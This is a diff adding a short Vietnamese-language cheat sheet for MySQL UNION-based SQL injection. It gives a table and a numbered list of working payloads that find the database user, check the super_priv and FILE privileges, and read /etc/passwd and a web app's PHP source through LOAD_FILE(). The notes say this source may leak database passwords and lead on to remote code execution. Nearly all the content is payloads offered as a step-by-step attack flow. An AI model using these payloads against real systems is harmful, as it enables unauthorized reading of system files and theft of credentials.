@@ -1,0 +1,27 @@
+| **Step**                | **Query / Payload**                                                                                            | **Thông tin thu được**                                | **Ý nghĩa để làm tiếp**                                                    |
+| ----------------------- | -------------------------------------------------------------------------------------------------------------  | ----------------------------------------------------- | -------------------------------------------------------------------------- |
+| 1️⃣ Xác định DB User    | `SELECT USER(); SELECT CURRENT_USER(); ' UNION SELECT 1,user(),3,4-- -`                                        | Tài khoản DB hiện tại (vd: `root@localhost`)          | Nếu là DBA (root) thì khả năng cao có quyền đọc/ghi file                   |
+| 2️⃣ Kiểm tra Privileges | `SELECT super_priv FROM mysql.user; ' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -`     | `Y` = có superuser privileges                         | Xác nhận user có đặc quyền cao                                             |
+|                         | `SELECT grantee,privilege_type FROM information_schema.user_privileges;`                                       | Danh sách toàn bộ quyền (vd: `FILE`)                  | Nếu có `FILE` privilege → có thể đọc file hệ thống                         |
+| 3️⃣ Đọc file hệ thống   | `SELECT LOAD_FILE('/etc/passwd');` ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -`                          | Nội dung file `/etc/passwd`                           | Chứng minh có thể đọc file OS                                              |
+| 4️⃣ Đọc source code web | `SELECT LOAD_FILE('/var/www/html/search.php'); ' UNION SELECT 1,LOAD_FILE('/var/www/html/search.php'),3,4-- -` | Nội dung code PHP của web (HTML, PHP code, DB creds…) | Có thể lộ config, DB password, đường dẫn include → mở rộng khai thác (RCE) |
+
+
+
+✅ Như vậy, flow bảng này đi theo thứ tự:
+DB User → Privileges → FILE Privilege → LOAD_FILE() → Source Code / Sensitive Files
+
+
+1. Lấy user hiện tại
+  ' UNION SELECT 1,user(),3,4-- -
+  ' UNION SELECT 1,user,3,4 FROM mysql.user-- -
+2. Kiểm tra superuser privileges  ( cài này trả về Y hoặc N ) 
+  ' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -
+3. Liệt kê quyền chi tiết của user   ( output cần thiết là FILE để minh chứng có quyền đọc file ) 
+  ' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+4. Đọc file hệ thống (ví dụ: /etc/passwd)
+  ' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
+5. Đọc file source code web (ví dụ: search.php)
+  ' UNION SELECT 1,LOAD_FILE("/var/www/html/search.php"),3,4-- -
+
+Chúng theo flow: User → Privileges → FILE Privilege → LOAD_FILE() → Dump file hệ thống / code web.
